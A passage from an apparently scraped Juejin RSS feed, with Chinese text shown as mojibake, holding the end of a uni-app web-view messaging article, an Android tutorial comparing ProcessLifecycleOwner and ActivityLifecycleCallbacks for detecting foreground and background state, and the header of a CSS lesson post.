<p>æ‰€ä»¥é‡‡ç”¨ html+ åŸç”Ÿæ–¹æ³•å‘é€æ•°æ®ï¼Œåœ¨ web-view ä¸­ä½¿ç”¨ <code>plus.webview.postMessageToUniNView</code> æ–¹æ³•å‘é€æ•°æ®ã€‚</p>
<p>åœ¨ uni-app ç«¯ä½¿ç”¨ <code>plus.globalEvent.addEventListener</code> æ¥æ”¶æ•°æ®ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å‘é€æ•°æ®</span>
<span class="hljs-title function_">pushMessage</span>(<span class="hljs-params"/>) {
    plus.<span class="hljs-property">webview</span>.<span class="hljs-title function_">postMessageToUniNView</span>({
        <span class="hljs-attr">type</span>: <span class="hljs-string">'tpUniAPP'</span>,
        <span class="hljs-attr">args</span>: {
            <span class="hljs-attr">args1</span>: <span class="hljs-string">'test123'</span>
        }
    }, <span class="hljs-string">'__uniapp__service'</span>);
}
</code></pre>
<p>æ¥æ”¶æ•°æ®æ–¹æ³•å†™åœ¨ <code>createWebView</code> æ–¹æ³•å†…ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ¥æ”¶æ•°æ®</span>
<span class="hljs-title function_">createWebView</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">let</span> that = <span class="hljs-variable language_">this</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„ WebView</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span> = plus.<span class="hljs-property">webview</span>.<span class="hljs-title function_">create</span>(
        ...
    );
    
    <span class="hljs-comment">// web-viewåŠ è½½å®Œæˆ</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'loaded'</span>, <span class="hljs-function">() =&gt;</span> {
        plus.<span class="hljs-property">globalEvent</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'plusMessage'</span>, <span class="hljs-function">(<span class="hljs-params">message</span>)=&gt;</span>{
            <span class="hljs-keyword">let</span> data = message?.<span class="hljs-property">data</span>?.<span class="hljs-property">args</span>?.<span class="hljs-property">data</span>;
            <span class="hljs-keyword">if</span>(data?.<span class="hljs-property">name</span> === <span class="hljs-string">'postMessage'</span>) {
                <span class="hljs-keyword">if</span> (data?.<span class="hljs-property">arg</span>?.<span class="hljs-property">type</span> === <span class="hljs-string">'show'</span>) {
                    <span class="hljs-comment">// æ˜¾ç¤º</span>
                    that.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">show</span>();
                }
                <span class="hljs-keyword">if</span> (data?.<span class="hljs-property">arg</span>?.<span class="hljs-property">type</span> === <span class="hljs-string">'hide'</span>) {
                    <span class="hljs-comment">// éšè—</span>
                    that.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">hide</span>();
                }
            }
        })
    });
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">hide</span>();
},
</code></pre>
<h2 data-id="heading-3">ç»“è®º</h2>
<p>ç›®å‰ä¸»è¦è§£å†³äº†ä¸¤ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li>web-view å¤§å°ã€æ˜¾éšä¸å¯æ§é—®é¢˜ã€‚</li>
<li>web-view ä¸ uni-app é€šä¿¡é—®é¢˜ã€‚</li>
</ol>
<p>å‘é€æ•°æ®æ–¹æ³•å¯ä»¥å¸è½½ Pinia çš„å…¬å…±æ–¹æ³•ä¸­ï¼Œæˆ–è€…ä½¿ç”¨ EventBusï¼Œç»Ÿä¸€å¤„ç†ã€‚</p>
<p>Ps: ç¬¬äºŒä¸ªé—®é¢˜è§£å†³æ–¹æ¡ˆä¸æ˜¯å¤ªä¼˜é›…ï¼Œå¦‚æœæœ‰å…„å¼Ÿæœ‰æ›´å¥½çš„æ–¹æ¡ˆå¯ä»¥åˆ†äº«ä¸€ä¸‹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android å¼€å‘ä¸­ï¼Œå‡†ç¡®åˆ¤æ–­åº”ç”¨å¤„äºâ€œå‰å°ï¼ˆForegroundï¼‰â€è¿˜æ˜¯â€œåå°ï¼ˆBackgroundï¼‰]]></title>    <link>https://juejin.cn/post/7595108457496346639</link>    <guid>https://juejin.cn/post/7595108457496346639</guid>    <pubDate>2026-01-15T06:28:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595108457496346639" data-draft-id="7595147176752332800" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android å¼€å‘ä¸­ï¼Œå‡†ç¡®åˆ¤æ–­åº”ç”¨å¤„äºâ€œå‰å°ï¼ˆForegroundï¼‰â€è¿˜æ˜¯â€œåå°ï¼ˆBackgroundï¼‰"/> <meta itemprop="keywords" content="Android,å®¢æˆ·ç«¯,APP"/> <meta itemprop="datePublished" content="2026-01-15T06:28:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Gemini001"/> <meta itemprop="url" content="https://juejin.cn/user/2333635831676704"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android å¼€å‘ä¸­ï¼Œå‡†ç¡®åˆ¤æ–­åº”ç”¨å¤„äºâ€œå‰å°ï¼ˆForegroundï¼‰â€è¿˜æ˜¯â€œåå°ï¼ˆBackgroundï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2333635831676704/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Gemini001
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T06:28:55.000Z" title="Thu Jan 15 2026 06:28:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Android åº”ç”¨å‰åå°çŠ¶æ€åˆ¤æ–­æ·±åº¦è§£æ</h2>
<p>åœ¨ Android å¼€å‘ä¸­ï¼Œå‡†ç¡®åˆ¤æ–­åº”ç”¨å¤„äº<strong>å‰å°ï¼ˆForegroundï¼‰</strong> è¿˜æ˜¯<strong>åå°ï¼ˆBackgroundï¼‰</strong> æ˜¯å®ç°å¾ˆå¤šä¸šåŠ¡é€»è¾‘çš„åŸºç¡€ã€‚æœ¬æ–‡å°†æ·±å…¥åˆ†æç›®å‰æœ€ä¸ºä¸»æµä¸”å¯é çš„ä¸¤ç§å®ç°æ–¹å¼ï¼š<strong>Jetpack ProcessLifecycleOwner</strong>â€‹ å’ŒÂ <strong>ActivityLifecycleCallbacks è®¡æ•°æ³•</strong>ï¼Œå¹¶ä»æºç è§’åº¦åˆ†æå®ƒä»¬çš„åº•å±‚å·¥ä½œåŸç†ã€‚</p>
<hr/>
<h3 data-id="heading-1">ä¸€ã€æ–¹æ¡ˆä¸€ï¼šJetpack ProcessLifecycleOwnerï¼ˆå®˜æ–¹é¦–é€‰ï¼‰</h3>
<p>è¿™æ˜¯ Google æ¨èçš„æ ‡å‡†åšæ³•ã€‚å®ƒå°†æ•´ä¸ª App çš„è¿›ç¨‹æŠ½è±¡ä¸ºä¸€ä¸ªÂ <code>LifecycleOwner</code>ã€‚</p>
<h4 data-id="heading-2">1. ä½¿ç”¨æ–¹æ³•</h4>
<p>åœ¨Â <code>build.gradle</code>ä¸­å¼•å…¥ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">implementation <span class="hljs-string">"androidx.lifecycle:lifecycle-process:2.6.2"</span>
</code></pre>
<p>åœ¨Â <code>Application</code>ä¸­ç›‘å¬ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApp</span> : <span class="hljs-type">Application</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onCreate()
        ProcessLifecycleOwner.<span class="hljs-keyword">get</span>().lifecycle.addObserver(
            <span class="hljs-keyword">object</span> : DefaultLifecycleObserver {
                <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onStart</span><span class="hljs-params">(owner: <span class="hljs-type">LifecycleOwner</span>)</span></span> {
                    <span class="hljs-comment">// App å›åˆ°å‰å°</span>
                }
                
                <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onStop</span><span class="hljs-params">(owner: <span class="hljs-type">LifecycleOwner</span>)</span></span> {
                    <span class="hljs-comment">// App é€€åˆ°åå°</span>
                }
            }
        )
    }
}
</code></pre>
<h4 data-id="heading-3">2. æºç åŸç†åˆ†æ</h4>
<p><code>ProcessLifecycleOwner</code>çš„æ ¸å¿ƒæ˜¯åˆ©ç”¨ä¸€ä¸ªåä¸ºÂ <code>ProcessLifecycleOwnerInitializer</code>çš„Â <code>ContentProvider</code>è‡ªåŠ¨å¯åŠ¨ã€‚</p>
<p>å…³é”®æºç ï¼š<code>ProcessLifecyclePolicy</code>é€šè¿‡æ³¨å†ŒÂ <code>ActivityLifecycleCallbacks</code>æ¥ç›‘å¬æ‰€æœ‰ Activity çš„ç”Ÿå‘½å‘¨æœŸï¼Œå¹¶åšäº†ä¸¤ä»¶ç‰¹æ®Šçš„äº‹ï¼š</p>
<p><strong>1. åˆ†å‘å»¶è¿Ÿï¼ˆTIMEOUTï¼‰</strong></p>
<p>æºç ä¸­å®šä¹‰äº†Â <code>TIMEOUT_MS = 700ms</code>ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// æºç ä¼ªä»£ç </span>
void <span class="hljs-built_in">onActivityStopped</span>() {
    mStartedCounter--;
    if (mStartedCounter == <span class="hljs-number">0</span> &amp;&amp; mPauseSent) {
        <span class="hljs-comment">// å¹¶ä¸æ˜¯ç«‹å³å‘é€ Stopï¼Œè€Œæ˜¯é€šè¿‡ Handler å»¶è¿Ÿå‘é€</span>
        mHandler<span class="hljs-selector-class">.postAtTime</span>(mDelayedPauseRunnable, mLastPausedTime + TIMEOUT_MS);
    }
}
</code></pre>
<p><strong>åŸç†</strong>ï¼šå½“ Activity A åˆ‡æ¢åˆ° Activity B æ—¶ï¼ŒA ä¼šå…ˆ Stopï¼ŒB å† Startã€‚å¦‚æœæ²¡æœ‰è¿™ä¸ªå»¶è¿Ÿï¼ŒApp ä¼šåœ¨åˆ‡æ¢ç¬é—´äº§ç”Ÿä¸€æ¬¡"æ‰å…¥åå°å†å›åˆ°å‰å°"çš„è¯¯åˆ¤ã€‚è¿™ 700ms ç¡®ä¿äº† Activity è·³è½¬æ—¶çš„è¿ç»­æ€§ã€‚</p>
<p><strong>2. çŠ¶æ€æŒ‚é’©</strong></p>
<p>å®ƒä¸ä»…ç›‘å¬Â <code>onStop</code>ï¼Œè¿˜ç›‘å¬Â <code>onPause</code>ã€‚åªæœ‰å½“æœ€åä¸€ä¸ª Activity çœŸæ­£ä¸å¯è§ä¸”è¶…è¿‡äº†ç¼“å†²æ—¶é—´ï¼Œæ‰ä¼šåˆ†å‘Â <code>ON_STOP</code>äº‹ä»¶ã€‚</p>
<hr/>
<h3 data-id="heading-4">äºŒã€æ–¹æ¡ˆäºŒï¼šActivityLifecycleCallbacks è®¡æ•°æ³•ï¼ˆçµæ´»è‡ªç ”ï¼‰</h3>
<p>å¦‚æœä½ ä¸æƒ³å¼•å…¥ Lifecycle åº“ï¼Œæˆ–è€…éœ€è¦åœ¨å›è°ƒä¸­ç«‹å³æ‹¿åˆ°å½“å‰ Activity å®ä¾‹ï¼Œè¿™æ˜¯æœ€å¯é çš„æ›¿ä»£æ–¹æ¡ˆã€‚</p>
<h4 data-id="heading-5">1. å®ç°é€»è¾‘</h4>
<p>åˆ©ç”¨Â <code>Application.ActivityLifecycleCallbacks</code>æ¥å£ï¼Œé€šè¿‡ä¸€ä¸ªå…¨å±€è®¡æ•°å™¨ç»Ÿè®¡ Started çŠ¶æ€çš„ Activity æ•°é‡ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AppForegroundDetector</span> : <span class="hljs-type">Application.ActivityLifecycleCallbacks</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> startCounter = <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onActivityStarted</span><span class="hljs-params">(activity: <span class="hljs-type">Activity</span>)</span></span> {
        <span class="hljs-keyword">if</span> (startCounter == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// ä» 0 å˜ä¸º 1ï¼Œè¯´æ˜æ˜¯ä»åå°è¿›å…¥å‰å°</span>
            onAppForeground(activity)
        }
        startCounter++
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onActivityStopped</span><span class="hljs-params">(activity: <span class="hljs-type">Activity</span>)</span></span> {
        startCounter--
        <span class="hljs-keyword">if</span> (startCounter == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// ä» 1 å˜ä¸º 0ï¼Œè¯´æ˜æ‰€æœ‰ Activity éƒ½ä¸å¯è§äº†</span>
            onAppBackground()
        }
    }
    
    <span class="hljs-comment">// ... å…¶ä»–æ–¹æ³•ç©ºå®ç°</span>
}
</code></pre>
<h4 data-id="heading-6">2. æ·±å…¥åŸç†åˆ†æ</h4>
<p><strong>ä¸ºä»€ä¹ˆæ˜¯Â <code>onActivityStarted</code>è€Œä¸æ˜¯Â <code>onActivityResumed</code>ï¼Ÿ</strong></p>
<p>è¿™æ˜¯å¾ˆå¤šå¼€å‘è€…çš„è¯¯åŒºã€‚æˆ‘ä»¬æ¥çœ‹ Android ç³»ç»Ÿçš„ç”Ÿå‘½å‘¨æœŸå®šä¹‰ï¼š</p>
<ul>
<li><strong>Started/Stopped</strong>ï¼šæ§åˆ¶çš„æ˜¯ Visibilityï¼ˆå¯è§æ€§ï¼‰</li>
<li><strong>Resumed/Paused</strong>ï¼šæ§åˆ¶çš„æ˜¯ Focusï¼ˆç„¦ç‚¹ï¼‰</li>
</ul>
<p><strong>å¼‚å¸¸åœºæ™¯åˆ†æ</strong>ï¼š</p>
<ul>
<li><strong>åœºæ™¯ Aï¼ˆç³»ç»Ÿæƒé™å¼¹çª—ï¼‰</strong> ï¼šå½“ App å¼¹å‡ºç³»ç»Ÿæƒé™è¯·æ±‚å¯¹è¯æ¡†æ—¶ï¼Œå½“å‰ Activity ä¼šå¤±å»ç„¦ç‚¹ï¼ˆæ‰§è¡ŒÂ <code>onPause</code>ï¼‰ï¼Œä½†å®ƒä¾ç„¶å¯è§ï¼ˆä¸æ‰§è¡ŒÂ <code>onStop</code>ï¼‰ã€‚å¦‚æœç”¨Â <code>Resumed</code>è®¡æ•°ï¼Œæ­¤æ—¶ä¼šè¯¯åˆ¤ä¸º App è¿›å…¥äº†åå°</li>
<li><strong>åœºæ™¯ Bï¼ˆé€æ˜ Activityï¼‰</strong> ï¼šå¦‚æœä½ å¯åŠ¨äº†ä¸€ä¸ªé€æ˜çš„ Activityï¼Œå‰ä¸€ä¸ª Activity ä¼šÂ <code>onPause</code>ä½†ä¸ä¼šÂ <code>onStop</code></li>
</ul>
<p>âœ…Â <strong>ç»“è®º</strong>ï¼šåªæœ‰ä½¿ç”¨Â <code>onActivityStarted/Stopped</code>æ‰èƒ½çœŸå®åæ˜  App æ˜¯å¦åœ¨ç”¨æˆ·è§†çº¿å†…ã€‚</p>
<hr/>
<h3 data-id="heading-7">ä¸‰ã€ä¸¤ç§æ–¹æ¡ˆçš„å¯¹æ¯”ä¸é€‰æ‹©</h3>






























<table><thead><tr><th>ç‰¹æ€§</th><th>ProcessLifecycleOwner</th><th>ActivityLifecycleCallbacks è®¡æ•°æ³•</th></tr></thead><tbody><tr><td>é›†æˆéš¾åº¦</td><td>æä½ï¼ˆæ·»åŠ ä¾èµ–å³å¯ï¼‰</td><td>ä¸­ï¼ˆéœ€è¦æ‰‹åŠ¨å†™è®¡æ•°é€»è¾‘ï¼‰</td></tr><tr><td>åŠæ—¶æ€§</td><td>æœ‰ 700ms å»¶è¿Ÿï¼ˆé˜²æŠ–åŠ¨ï¼‰</td><td>å®æ—¶è§¦å‘ï¼ˆæ— å»¶è¿Ÿï¼‰</td></tr><tr><td>Activity å¼•ç”¨</td><td>æ— æ³•ç›´æ¥è·å–å½“å‰ Activity</td><td>å¯ä»¥åœ¨å›è°ƒä¸­ç›´æ¥è·å– Activity å®ä¾‹</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>ç»å¤§å¤šæ•°ä¸šåŠ¡ï¼ˆåˆå§‹åŒ–ã€ç»Ÿè®¡ï¼‰</td><td>éœ€è¦åœ¨å›åˆ°å‰å°ç«‹åˆ»å¼¹çª—ã€ä¸ UI å¼ºè€¦åˆçš„åœºæ™¯</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-8">å››ã€æœ€ä½³å®è·µå»ºè®®</h3>
<p>åœ¨å®é™…å•†ä¸šé¡¹ç›®ä¸­ï¼Œæ¨è<strong>ç»„åˆä½¿ç”¨</strong>ï¼š</p>
<ol>
<li>
<p><strong>å…¨å±€çŠ¶æ€ç›‘æ§</strong>ï¼šä½¿ç”¨Â <code>ProcessLifecycleOwner</code>è´Ÿè´£é‚£äº›ä¸ UI æ— å…³çš„é€»è¾‘ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>ä¸ŠæŠ¥ App åœ¨çº¿æ—¶é•¿</li>
<li>æ¸…ç†è¿‡æœŸç¼“å­˜</li>
<li>æ£€æŸ¥é™é»˜æ›´æ–°</li>
</ul>
</li>
<li>
<p><strong>UI äº¤äº’é€»è¾‘</strong>ï¼šå¦‚æœä½ éœ€è¦åœ¨ App å›åˆ°å‰å°æ—¶ç«‹åˆ»å¼¹å‡ºä¸€ä¸ª"æ¬¢è¿å›æ¥"çš„ Dialogï¼Œå»ºè®®ä½¿ç”¨è®¡æ•°å™¨æ–¹æ¡ˆï¼Œå› ä¸ºä½ å¯ä»¥é€šè¿‡Â <code>onActivityStarted(activity: Activity)</code>ç›´æ¥æ‹¿åˆ°å½“å‰çš„ Context æ¥å¼¹å‡ºå¯¹è¯æ¡†ã€‚</p>
</li>
</ol>
<p>âš ï¸Â <strong>æ³¨æ„å‘ç‚¹</strong>ï¼š</p>
<p>ç”±äº Android å¤„ç†è¿›ç¨‹æ€æ­»çš„æœºåˆ¶ï¼Œå½“è¿›ç¨‹åœ¨åå°è¢«ç³»ç»Ÿå›æ”¶åé‡æ–°å¯åŠ¨ï¼Œ<code>startCounter</code>ä¼šé‡æ–°ä» 0 å¼€å§‹è®¡ç®—ã€‚è¿™é€šå¸¸ç¬¦åˆæˆ‘ä»¬çš„é¢„æœŸï¼Œå› ä¸ºæ­¤æ—¶ç¡®å®æ˜¯"è¿›å…¥äº†å‰å°"ï¼Œä½†éœ€è¦æ³¨æ„åœ¨Â <code>onCreate</code>ä¸­æ¢å¤ç›¸å…³çŠ¶æ€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€ å‰ç«¯ä¸‰å‰‘å®¢-39 /Lesson65(2025-12-12)ã€‘ä»åŸºç¡€å‡ ä½•å›¾å½¢åˆ°æ–¹å‘ç¬¦å·çš„æ¼”è¿›ä¸åº”ç”¨ğŸ“â¡ï¸ğŸªœâ¡ï¸ğŸ¥§â¡ï¸â­•â¡ï¸ğŸ›â¡ï¸ğŸ§­]]></title>    <link>https://juejin.cn/post/7595142651728248851</link>    <guid>https://juejin.cn/post/7595142651728248851</guid>    <pubDate>2026-01-15T10:22:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595142651728248851" data-draft-id="7595401278465851433" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€ å‰ç«¯ä¸‰å‰‘å®¢-39 /Lesson65(2025-12-12)ã€‘ä»åŸºç¡€å‡ ä½•å›¾å½¢åˆ°æ–¹å‘ç¬¦å·çš„æ¼”è¿›ä¸åº”ç”¨ğŸ“â¡ï¸ğŸªœâ¡ï¸ğŸ¥§â¡ï¸â­•â¡ï¸ğŸ›â¡ï¸ğŸ§­"/> <meta itemprop="keywords" content="å‰ç«¯,CSS,HTML"/> <meta itemprop="datePublished" content="2026-01-15T10:22:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jing_Rainbow"/> <meta itemprop="url" content="https://juejin.cn/user/1285809519198256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€ å‰ç«¯ä¸‰å‰‘å®¢-39 /Lesson65(2025-12-12)ã€‘ä»åŸºç¡€å‡ ä½•å›¾å½¢åˆ°æ–¹å‘ç¬¦å·çš„æ¼”è¿›ä¸åº”ç”¨ğŸ“â¡ï¸ğŸªœâ¡ï¸ğŸ¥§â¡ï¸â­•â¡ï¸ğŸ›â¡ï¸ğŸ§­
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1285809519198256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jing_Rainbow
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T10:22:43.000Z" title="Thu Jan 15 2026 10:22:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
